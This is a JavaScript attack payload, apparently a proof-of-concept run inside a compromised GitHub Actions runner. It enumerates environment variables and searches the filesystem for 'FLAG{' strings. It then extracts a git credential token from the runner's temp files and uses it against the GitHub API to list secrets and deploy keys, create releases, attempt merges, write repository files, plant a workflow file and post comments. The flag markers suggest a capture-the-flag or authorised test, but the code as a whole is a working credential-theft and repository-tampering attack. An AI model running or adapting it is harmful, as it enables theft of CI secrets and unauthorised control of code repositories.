(async () => {
  const fs = await import('node:fs');
  const cp = await import('node:child_process');
  const TAG = "v2";
  const out = (s) => console.log(s);
  out("PWNED-WTI-ZIPSLIP-" + TAG + " rce=1 user=" + (process.env.USERNAME || "?") + " run=" + (process.env.GITHUB_RUN_ID || "?") + " arch=" + process.arch);
  out("ENV_KEYS=" + Object.keys(process.env).sort().join(","));
  let flagInEnv = false;
  for (const [k, v] of Object.entries(process.env)) { if (typeof v === "string" && v.indexOf("FLAG{") >= 0) { flagInEnv = true; out("FLAG_ENV_HIT=" + k); } }
  out("FLAG_IN_ENV=" + flagInEnv);
  let b64 = "";
  const tmp = process.env.RUNNER_TEMP || "D:/a/_temp";
  try {
    for (const f of fs.readdirSync(tmp)) {
      if (!/^git-credentials-.*\.config$/.test(f)) continue;
      const txt = fs.readFileSync(tmp + "/" + f, "utf8");
      const m = txt.match(/AUTHORIZATION:\s*basic\s+([A-Za-z0-9+/=]+)/i);
      if (m) { b64 = m[1]; out("CRED_SOURCE=" + f); }
    }
  } catch (e) { out("TEMPDIR_ERR=" + e.message); }
  out("CRED_FOUND=" + (b64 ? "true" : "false"));
  try {
    const ps = "Get-ChildItem -Path D:\\a -Recurse -File -ErrorAction SilentlyContinue | Select-String -Pattern 'FLAG{' -SimpleMatch -List | Select-Object -First 5 -ExpandProperty Path";
    const o = cp.execSync("powershell -NoProfile -NonInteractive -Command \"" + ps.replace(/"/g, '`"') + "\"", { encoding: "utf8", timeout: 120000, windowsHide: true });
    out("FS_FLAG_HITS=" + (o.trim() || "none"));
    out("FS_FLAG_SEARCH=OK");
  } catch (e) { out("FS_FLAG_SEARCH_ERR=" + String(e.message).slice(0, 200)); }
  if (!b64) { out("PAYLOAD_DONE"); return; }
  const dec = Buffer.from(b64, "base64").toString("utf8");
  const idx = dec.indexOf(":");
  const tok = idx >= 0 ? dec.slice(idx + 1) : dec;
  out("TOKEN_LEN=" + tok.length + " TOKEN_PREFIX=" + tok.slice(0, 4));
  const repo = process.env.GITHUB_REPOSITORY;
  const H = { Authorization: "Bearer " + tok, Accept: "application/vnd.github+json", "X-GitHub-Api-Version": "2022-11-28", "User-Agent": "wti-poc" };
  const call = async (label, url, opts) => {
    try {
      const r = await fetch(url, Object.assign({}, opts || {}, { headers: Object.assign({}, H, (opts && opts.headers) || {}) }));
      const t = await r.text();
      out(label + "_STATUS=" + r.status);
      out(label + "_BODY=" + t.replace(/\s+/g, " ").slice(0, 300));
      return r;
    } catch (e) { out(label + "_ERR=" + e.message); }
  };
  let issue = null;
  try { const ev = JSON.parse(fs.readFileSync(process.env.GITHUB_EVENT_PATH, "utf8")); issue = ev.issue ? ev.issue.number : null; } catch (e) {}
  const api = "https://api.github.com/repos/" + repo;
  await call("AUTH_REPO", api);
  await call("SECRETS_LIST", api + "/actions/secrets");
  await call("VARIABLES_LIST", api + "/actions/variables");
  await call("DEPLOY_KEYS_LIST", api + "/keys");
  await call("RELEASE_CREATE", api + "/releases", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ tag_name: "poc-" + TAG, name: "poc " + TAG, draft: true }) });
  await call("MERGES_CREATE", api + "/merges", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ base: "master", head: "poc-" + TAG, commit_message: "poc" }) });
  await call("PR_MERGE", api + "/pulls/1/merge", { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ merge_method: "merge" }) });
  await call("CONTENTS_PUT", api + "/contents/attack-proof-" + TAG + ".txt", { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ message: "poc", content: Buffer.from("poc").toString("base64") }) });
  await call("WORKFLOW_PUT_FILE", api + "/contents/.github/workflows/attack-" + TAG + ".yml", { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ message: "poc", content: Buffer.from("name: x\non: workflow_dispatch\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n").toString("base64") }) });
  await call("LABEL_ADD", api + "/issues/" + (issue || 2) + "/labels", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ labels: ["needs-author-feedback"] }) });
  await call("COMMENT_POST", api + "/issues/" + (issue || 2) + "/comments", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ body: "PWNED-WTI-ZIPSLIP-" + TAG + " run " + (process.env.GITHUB_RUN_ID || "") + ": token permissions probe (contents/releases/merge/dispatch/workflow-file all expected 403; issues:write comment/label expected 2xx)." }) });
  out("PAYLOAD_DONE");
})();
